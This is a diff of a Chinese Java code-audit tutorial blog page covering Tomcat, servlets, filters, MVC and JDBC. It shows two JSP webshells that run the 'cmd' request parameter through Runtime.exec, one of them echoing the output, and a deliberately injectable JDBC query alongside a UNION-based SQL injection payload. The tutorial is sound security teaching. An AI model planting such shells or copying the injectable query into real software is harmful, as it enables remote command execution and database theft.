@@ -17,21 +17,23 @@
                 <meta name="author" content="whistle.H">
                 <meta name="keywords" content="">
                 
-                    <meta name="description" content="在上一章节，我们学习了Java SE的基础语法。 接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。">
+                    <meta name="description" content="在上一章节，我们学习了Java SE的一些基础。 接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。 为了方便我们后面的框架讲解，我们在这里引入jdbc的基本说明。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java代码审计（三） Java Web架构">
-<meta property="og:url" content="http://example.com/2023/09/18/blog0036-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89-Java%20Web/index.html">
+<meta property="og:title" content="Java代码审计（三） Java Web基础">
+<meta property="og:url" content="http://example.com/2023/09/18/blog0036-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89-Java%20Web%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="在上一章节，我们学习了Java SE的基础语法。 接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。">
+<meta property="og:description" content="在上一章节，我们学习了Java SE的一些基础。 接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。 为了方便我们后面的框架讲解，我们在这里引入jdbc的基本说明。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231006215631395.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023171340192.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023172921669.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212735228.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117232751813.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117233002748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png">
 <meta property="article:published_time" content="2023-09-18T09:57:16.000Z">
-<meta property="article:modified_time" content="2023-11-21T15:46:34.438Z">
+<meta property="article:modified_time" content="2024-02-29T12:15:41.270Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="notes">
@@ -42,7 +44,7 @@
                                 
                                         
                                                     <title>
-                                                        Java代码审计（三） Java Web架构 - The world of whistleH
+                                                        Java代码审计（三） Java Web基础 - The world of whistleH
                                                     </title>
 
                                                     <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
@@ -212,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Java代码审计（三） Java Web架构"></span>
+            <span id="subtitle" data-typed-text="Java代码审计（三） Java Web基础"></span>
           
         </div>
 
@@ -235,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.8k 字
+          9.6k 字
         
       </span>
     
@@ -246,7 +248,7 @@
         
         
         
-          49 分钟
+          80 分钟
         
       </span>
     
@@ -283,20 +285,20 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Java代码审计（三） Java Web架构</h1>
+            <h1 id="seo-header">Java代码审计（三） Java Web基础</h1>
             
             
               <div class="markdown-body">
                 
-                <p>在上一章节，我们学习了Java SE的基础语法。</p>
+                <p>在上一章节，我们学习了Java SE的一些基础。</p>
 <p>接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。</p>
+<p>为了方便我们后面的框架讲解，我们在这里引入jdbc的基本说明。</p>
 <span id="more"></span>
 <h2 id="java-web-架构">1、Java Web 架构</h2>
 <p>首先，我们明确Web应用的基本架构，也为了方便我们后续更好地理解Java Web。</p>
 <p><strong>浏览器</strong>：渲染前端页面，可以执行服务端下发的javascript脚本</p>
 <p><strong>服务器软件</strong>：也可以叫Web应用容器/服务器软件，常见的Tomcat、Weblogic等。当然，我们也可以将nginx的反向代理功能和tomcat结合作为一个整体的Web应用服务器。</p>
-<p>Web应用服务器的作用主要在<strong>用户和后端程序间做数据处理</strong>，起到一个桥梁作用，同时也用于管理后端应用程序进程。</p>
-<p>（我们在配置php的时候，apache + php_fpm模块组成的Web应用服务器往往都是自带的，因此不需要额外配置。）</p>
+<p>Web应用服务器的作用主要在<strong>用户和后端程序间做数据处理</strong>，起到一个桥梁作用，同时也用于管理后端应用程序进程。（我们在配置php的时候，apache + php_fpm模块组成的Web应用服务器往往都是自带的，因此不需要额外配置。）</p>
 <p><strong>Web后端程序</strong>：这里就是我们写的Java代码了。比如Servlet类，用来处理用户的请求以及响应。</p>
 <h2 id="java-web交互">2、Java Web交互</h2>
 <p>在Sun的Java Servlet规范中，对Java Web应用作了这样定义：“JavaWeb应用由一组Servlet、HTML页、类、以及其它可以被绑定的资源构成。它可以在各种供应商提供的实现Servlet规范的 <strong>Servlet容器</strong> 中运行。”</p>
@@ -305,10 +307,10 @@
 <p>我们常见的Servlet容器有：Tomcat、Weblogic等等。</p>
 <h2 id="tomcat">3、Tomcat</h2>
 <p>Tomcat是一款开源的Servlet容器，在实际开发中的使用非常广泛。</p>
-<p>对于Tomcat的目录结构，我们有这样的说明</p>
+<p>对于Tomcat的目录结构，我们有如下的说明</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">bin 	: 存放启动和关闭<span class="hljs-type">Tomcat</span>的脚本文件<br>conf	: <span class="hljs-type">Tomcat</span>各种配置文件的存放文职<br>lib		: 存放<span class="hljs-type">Tomcat</span>服务器和所有Web应用程序需要访问的jar文件<br>logs	: 存放<span class="hljs-type">Tomcat</span>的日志文件<br>temp	: 存放<span class="hljs-type">Tomcat</span>运行时生成的临时文件<br>webapps	: 存放<span class="hljs-type">Tomcat</span>的Web应用程序<br>work	: <span class="hljs-type">Tomcat</span>将JSP生成的Servlet源文件及字节码存放在这个目录下。<br></code></pre></td></tr></table></figure>
-<p>Tomcat的最常见的一个配置就是设置服务器软件监听的端口的配置，大部分情况下也只需要关注这个配置即可。</p>
-<p>在<code>conf/server.xml</code>找到<code>Connector</code>配置即可完成相应的配置</p>
+<p>Tomcat的最常见的一个配置就是设置服务器软件监听的端口的配置，基础情况下也只需要关注这个配置即可。</p>
+<p>在<code>conf/server.xml</code>找到<code>Connector</code>配置即可完成相应的配置，修改对应的port即可。</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231006215631395.png" srcset="/img/loading.gif" lazyload alt="image-20231006215631395" /></p>
 <h2 id="servlet技术">4、Servlet技术</h2>
 <h3 id="创建程序">4.1、创建程序</h3>
@@ -322,8 +324,8 @@
 <p>Servlet + JSP技术的路由配置其实有两种方式。</p>
 <h4 id="jsp文件路由">JSP文件路由</h4>
 <p>对于JSP文件，我们仍然可以通过文件路由的形式实现对它的访问。</p>
-<p>我们在index.jsp同目录下写入shell.jsp，看看是否能实现对它的利用，测试发现能够顺利连接。</p>
-<p>对于JSP文件，Java Web 仍然采用文件路由的形式来进行管理，这也是Java webshell的实现方式之一。</p>
+<p>我们在index.jsp<strong>同目录</strong>下写入shell.jsp，看看是否能实现对它的利用，测试发现能够顺利连接。</p>
+<p>对于JSP文件，Java Web 仍然采用文件路由的形式来进行管理，这也是Java Webshell的实现方式之一。</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023172921669.png" srcset="/img/loading.gif" lazyload alt="image-20231023172921669" /></p>
 <h4 id="路由注解">路由注解</h4>
 <p>在高版本的Servlet，已经支持在Servlet类加入路由注解，从而实现路由与Servlet的绑定。</p>
@@ -389,15 +391,7 @@ ServletRequest.getRequestDispatcher （参数可以是不以“/”开头的路�
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)); %&gt;<br></code></pre></td></tr></table></figure>
 <p>当然也可以尝试使用输入输出流打印webshell的输出，这样就能成功使用回显打印相应的内容。</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) !=  <span class="hljs-keyword">null</span>)<br>    &#123;<br>        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(in));<br><br>        PrintWriter pw = response.getWriter();<br>        String lines;<br><br>        pw.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((lines = br.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            pw.println(lines);<br>        &#125;<br>        pw.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
-<h2 id="mvc架构">6、MVC架构</h2>
-<p>MVC架构是Web中的常见架构，即Model-View-Controller</p>
-<ul>
-<li>模型是应用程序的主体部分，模型表示业务数据和业务逻辑。一个模型能为多个视图提供数据，由于应用于模型的代码只需写一次就可以被多个视图重用，所以提高了代码的可重用性。</li>
-<li><strong>视图</strong>是用户看到并与之交互的<strong>界面</strong>，视图向用户显示相关的数据、接受用户的输入、<strong>不进行任何实际的业务处理</strong>。</li>
-<li>控制器接受用户的输入并调用模型和视图去完成用户的需求。控制器接收请求并决定调用哪个模型组件去处理请求，然后决定调用哪个视图来显示模型处理返回的数据</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
-<h2 id="filter过滤器">7、Filter过滤器</h2>
+<h2 id="filter过滤器">6、Filter过滤器</h2>
 <p>Filter 的基本功能是对 Servlet 容器调用 Servlet 的过程进行拦截，从而在 Servlet 进行响应处理的前后实现一些特殊的功能。</p>
 <p>我们在设计Java Web的过程中，有的时候需要对多个Servlet做横向的拦截管理，这时候Filter类就能够起到作用。</p>
 <ul>
@@ -406,6 +400,50 @@ ServletRequest.getRequestDispatcher （参数可以是不以“/”开头的路�
 <li>Filter 程序需要在 web.xml 文件中进行注册和设置它所能拦截的资源：Filter 程序可以拦截 Jsp, Servlet, 不拦截静态图片文件和静态 html 文件</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212735228.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
+<p>这里我们实现一个简单的Filter类，配置方式和其他类一样，都可以写web.xml和路由注解方式。</p>
+<p>这个类实现的就是，对于除了login之外的路由，全部重定向到hello路由。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.javaservletbeginner;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;TestFilter&quot;,urlPatterns = &quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        HttpServletRequest req = (HttpServletRequest) request;<br>        HttpServletResponse resp = (HttpServletResponse) response;<br><br>        String requestUri = req.getRequestURI();<br>        System.out.println(requestUri);<br>        <span class="hljs-comment">// 获取路由</span><br>        <span class="hljs-keyword">if</span>(requestUri.contains(<span class="hljs-string">&quot;/login&quot;</span>))<br>        &#123;<br>            chain.doFilter(req, resp);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/hello&quot;</span>).forward(req, resp);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到访问路由abcd返回到hello界面</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117232751813.png" srcset="/img/loading.gif" lazyload alt="image-20240117232751813" /></p>
+<p>访问login路由返回到正常的页面</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117233002748.png" srcset="/img/loading.gif" lazyload alt="image-20240117233002748" /></p>
+<h2 id="mvc架构">7、MVC架构</h2>
+<p>MVC架构是Web中的常见架构，即Model-View-Controller</p>
+<ul>
+<li>模型是应用程序的主体部分，模型表示业务数据和业务逻辑。一个模型能为多个视图提供数据，由于应用于模型的代码只需写一次就可以被多个视图重用，所以提高了代码的可重用性。</li>
+<li><strong>视图</strong>是用户看到并与之交互的<strong>界面</strong>，视图向用户显示相关的数据、接受用户的输入、<strong>不进行任何实际的业务处理</strong>。</li>
+<li>控制器接受用户的输入并调用模型和视图去完成用户的需求。控制器接收请求并决定调用哪个模型组件去处理请求，然后决定调用哪个视图来显示模型处理返回的数据</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
+<h2 id="jdbc使用">8、JDBC使用</h2>
+<p>JDBC是Java原生和数据库进行交互的方式。JDBC实现数据库的操作基本是如下几个步骤：</p>
+<ol type="1">
+<li>注册驱动</li>
+<li>建立数据库连接</li>
+<li>创建待执行的SQL对象</li>
+<li>运行SQL对象</li>
+<li>获取处理结果</li>
+<li>释放资源</li>
+</ol>
+<h3 id="jdbc连接">8.1、JDBC连接</h3>
+<p>常见的数据库连接类如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String driver;<span class="hljs-comment">//连接数据库的驱动</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String url;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String password;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        driver = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<span class="hljs-comment">//需要的数据库驱动</span><br>        url = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/demo&quot;</span>;<span class="hljs-comment">//数据库名路径</span><br>        username = <span class="hljs-string">&quot;root&quot;</span>;<br>        password = <span class="hljs-string">&quot;root&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">open</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(driver);<span class="hljs-comment">//加载驱动</span><br>            <span class="hljs-keyword">return</span> (Connection) DriverManager.getConnection(url, username, password);<span class="hljs-comment">//创建链接</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br>            e.printStackTrace();<br>        &#125;<span class="hljs-comment">//加载驱动</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 关闭数据库</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(Connection conn)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (conn != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>对于数据库操作，我们需要引入<code>Statement</code>， 执行对象。目前常用的执行对象接口有三种： <strong>Statement、PreparedStatement</strong>和CallableStatement</p>
+<h3 id="statement">8.2、Statement</h3>
+<ul>
+<li>Statement 主要用于执行静态SQL语句。</li>
+<li>Statement 每执行一次都要对传入的SQL语句编译一次，效率较低 。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search1</span><span class="hljs-params">(Connection conn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 读取命令行输入</span><br>    System.out.println(<span class="hljs-string">&quot;Please input the id : &quot;</span>);<br>    Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br>    String id = sc.nextLine();<br>    <span class="hljs-keyword">try</span>&#123;<br>        String sql = <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        Statement st = conn.createStatement();<br>        rs = st.executeQuery(sql);<br>        <span class="hljs-keyword">while</span>(rs.next())<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;id : &quot;</span> + rs.getInt(<span class="hljs-string">&quot;id&quot;</span>) +<br>                            <span class="hljs-string">&quot;\tname : &quot;</span> + rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span> (SQLException e)<br>    &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到我们如果尝试写入id的值为，就能够成功实现注入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>, <span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<h3 id="preparedstatement">8.3、PreparedStatement</h3>
+<p>预编译，指的是在SQL语句中使用占位符从而避免传入参数被执行。通过占位符传递的字符串，将不会被识别为SQL的<code>关键字</code>。</p>
+<p>同时这也就引入了面试的一个高频面试考点，预编译无法在order by之后使用，因为order by其后跟着的是SQL的列名。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search2</span><span class="hljs-params">(Connection conn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 读取命令行输入</span><br>    System.out.println(<span class="hljs-string">&quot;Please input the id : &quot;</span>);<br>    Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br>    String id = sc.nextLine();<br>    <span class="hljs-keyword">try</span>&#123;<br>        String sql = <span class="hljs-string">&quot;select * from users where id = ?&quot;</span>;<br>        PreparedStatement pstmt = (PreparedStatement)conn.prepareStatement(sql);<br>        pstmt.setString(<span class="hljs-number">1</span>, id);<br><br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        rs = pstmt.executeQuery();<br>        <span class="hljs-keyword">while</span>(rs.next())<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;id : &quot;</span> + rs.getInt(<span class="hljs-string">&quot;id&quot;</span>) +<br>                    <span class="hljs-string">&quot;\tname : &quot;</span> + rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span> (SQLException e)<br>    &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="callablestatement">8.4、CallableStatement</h3>
+<p>CallableStatement接口提供了执行存储过程的方法。</p>
+<p>存储过程导致漏洞的原因，其实也是因为参数传入导致字符串拼接，这个跟Java本身的接口实现并没有非常深入的关系。</p>
 
                 
               </div>
@@ -462,8 +500,8 @@ ServletRequest.getRequestDispatcher （参数可以是不以“/”开头的路�
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Java代码审计（三） Java Web架构</div>
-      <div>http://example.com/2023/09/18/blog0036-Java代码审计（三）-Java Web/</div>
+      <div>Java代码审计（三） Java Web基础</div>
+      <div>http://example.com/2023/09/18/blog0036-Java代码审计（三）-Java Web基础/</div>
     </div>
     <div class="license-meta">
       
